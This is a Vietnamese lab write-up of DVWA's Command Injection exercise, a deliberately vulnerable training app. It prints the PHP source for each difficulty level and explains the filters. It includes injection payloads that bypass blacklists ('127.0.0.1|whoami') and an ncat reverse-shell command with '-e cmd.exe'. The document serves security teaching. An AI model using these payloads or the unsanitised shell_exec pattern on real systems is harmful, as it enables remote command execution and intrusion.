# Command Injection (DVWA)

## Đề bài

![image](https://hackmd.io/_uploads/Sy9tfN-xR.png)

- chúng ta cần biết được tên user của hệ điều hành trên website

## LOW LEVEL

![image](https://hackmd.io/_uploads/rkoCbEWgA.png)

### PHân tích

- đọc source code mình được:

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

Đoạn mã trên là một đoạn mã PHP đơn giản thực hiện các bước sau:

- Nhận đầu vào từ người dùng (trong trường 'ip') bằng cách sử dụng $\_REQUEST['ip'] và lưu trữ vào biến $target.
- Xác định hệ điều hành của máy chủ bằng cách sử dụng hàm php_uname('s'), và sau đó thực hiện lệnh ping tới địa chỉ IP được nhập bởi người dùng.
- Đối với hệ điều hành Windows, đoạn mã sử dụng shell_exec('ping ' . $target) để thực hiện lệnh ping, trong khi đối với hệ điều hành Unix, nó sử dụng shell_exec('ping -c 4 ' . $target) để thực hiện lệnh ping với 4 gói tin.
- Kết quả của lệnh ping được lưu vào biến $cmd.
- Kết quả được xuất ra cho người dùng thông qua thẻ `<pre>` để hiển thị dễ đọc hơn.

vậy đoạn code không có cơ chế validate lỗi command injection

### Khai thác

- mình chèn thêm câu lệnh whoami và được hệ thống thực thi

![image](https://hackmd.io/_uploads/Hk1bHVWxA.png)

- tiếp theo mình sẽ chèn shell để netcat đến server mình tạo tại port 8000

```bash
127.0.0.1 && ncat 127.0.0.1 8000 -e cmd.exe
```

![image](https://hackmd.io/_uploads/rybETVWe0.png)

và mình đã chiếm được shel để tương tác với hệ thống

![image](https://hackmd.io/_uploads/rk9WpV-g0.png)

## MEDIUM LEVEL

### Phân tích

- đọc source code mình được:

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

Đoạn mã PHP trên có chức năng tương tự như đoạn mã trước, nhưng có một số điểm khác biệt:

- Đoạn mã này cũng kiểm tra xem form đã được submit hay chưa bằng cách kiểm tra nút có tên 'Submit' có được nhấn hay không.
- Sau khi nhận đầu vào từ trường 'ip' trong form, đoạn mã này không kiểm tra mã thông báo chống CSRF như trong đoạn mã trước.
- Thay vào đó, đoạn mã này xây dựng một danh sách đen (blacklist) các chuỗi cần loại bỏ khỏi đầu vào. Trong trường hợp này, các ký tự '&&' và ';' được loại bỏ.
- Sau đó, đoạn mã này loại bỏ bất kỳ ký tự nào trong danh sách đen khỏi đầu vào bằng cách sử dụng hàm str_replace().
- Tiếp theo, nó xác định hệ điều hành đang chạy và thực thi lệnh ping tới địa chỉ IP đã nhập.
- Kết quả của lệnh ping được hiển thị cho người dùng.

### Khai thác

- mình thử khai thác như low level nhưng chương trình đã phát hiện command và chặn

![image](https://hackmd.io/_uploads/HJ-DdN-gA.png)

- tiếp theo mình thử tách 2 câu lệnh với các ký tự không có trong blacklist và thành công

```bash
127.0.0.1 | whoami
```

![image](https://hackmd.io/_uploads/Sydc_4-eA.png)

```bash
127.0.0.1 & whoami
```

![image](https://hackmd.io/_uploads/SkL0dEWg0.png)

và tiếp theo chúng ta có thể RCE tương tự như low level

## HIGH LEVEL

### Phân tích

- đọc source code mình được:

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

Đoạn mã PHP này tương tự như hai đoạn mã trước, nhưng có một số cải tiến bổ sung để tăng cường bảo mật:

- Đoạn mã này cũng kiểm tra xem form đã được submit hay chưa bằng cách kiểm tra nút có tên 'Submit' có được nhấn hay không.
- Sau khi nhận đầu vào từ trường 'ip' trong form, đoạn mã này sử dụng hàm trim() để loại bỏ các khoảng trắng dư thừa từ đầu vào. Điều này giúp làm sạch dữ liệu đầu vào trước khi xử lý.
- Nó xây dựng một danh sách đen (blacklist) các ký tự cần loại bỏ khỏi đầu vào, bao gồm `&, ;, |, -, $, (, ),  và ||`. Những ký tự này thường được sử dụng trong các cuộc tấn công như chèn lệnh (command injection).
- Sau đó, nó loại bỏ bất kỳ ký tự nào trong danh sách đen khỏi đầu vào bằng cách sử dụng hàm str_replace().
- Tiếp theo, nó xác định hệ điều hành đang chạy và thực thi lệnh ping tới địa chỉ IP đã nhập.
- Kết quả của lệnh ping được hiển thị cho người dùng.

vậy đoạn code đã lọc được hầu hết các ký tự ngắt lệnh trên hệ điều hành

### Khai thác

- trang web bị lọc "| " nó có khoảng trắng nên chúng ta chỉ cần viết liền thành câu lệnh `127.0.0.1|whoami` và mình khai thác thành công

![image](https://hackmd.io/_uploads/Sykw4SbeC.png)

## IMPOSSIBLE LEVEL

### Phân tích

- đọc source code mình được:

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );

    // Split the IP into 4 octects
    $octet = explode( ".", $target );

    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

Đoạn mã trên là một đoạn mã PHP thực hiện các bước sau:

- Kiểm tra xem nút gửi (Submit) đã được nhấn hay chưa bằng cách sử dụng hàm isset($\_POST['Submit']). Điều này ngụ ý rằng đoạn mã này được thiết kế để xử lý khi biểu mẫu được gửi đi.
- Kiểm tra token chống CSRF (Cross-Site Request Forgery) bằng cách sử dụng hàm checkToken(). Điều này giúp ngăn chặn tấn công CSRF bằng cách so sánh token gửi đi từ người dùng với token được lưu trong phiên (session).
- Nhận đầu vào từ người dùng (trong trường 'ip') và loại bỏ các ký tự đặc biệt bằng hàm stripslashes().
- Chia địa chỉ IP thành 4 phần bằng cách sử dụng hàm explode(".", $target).
- Kiểm tra xem từng phần của địa chỉ IP có phải là số nguyên không bằng cách sử dụng hàm is_numeric() và kiểm tra xem có đủ 4 phần không bằng cách sử dụng sizeof($octet) == 4.
- Nếu tất cả các phần của địa chỉ IP đều là số nguyên, đoạn mã sẽ ghép các phần lại để tạo lại địa chỉ IP.
- Xác định hệ điều hành và thực hiện lệnh ping tới địa chỉ IP đó. Đối với Windows, đoạn mã sử dụng `shell_exec('ping ' . $target)` và đối với hệ điều hành Unix, nó sử dụng shell_exec('ping -c 4 ' . $target).
- Xuất kết quả của lệnh ping ra cho người dùng xem thông qua thẻ `<pre>`.
- Nếu địa chỉ IP không hợp lệ (không phải là số nguyên hoặc không đủ 4 phần), thông báo lỗi sẽ được xuất ra.
- Ngoài ra, đoạn mã cũng bao gồm hàm generateSessionToken() để tạo token phiên mới để ngăn chặn các tấn công CSRF.

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
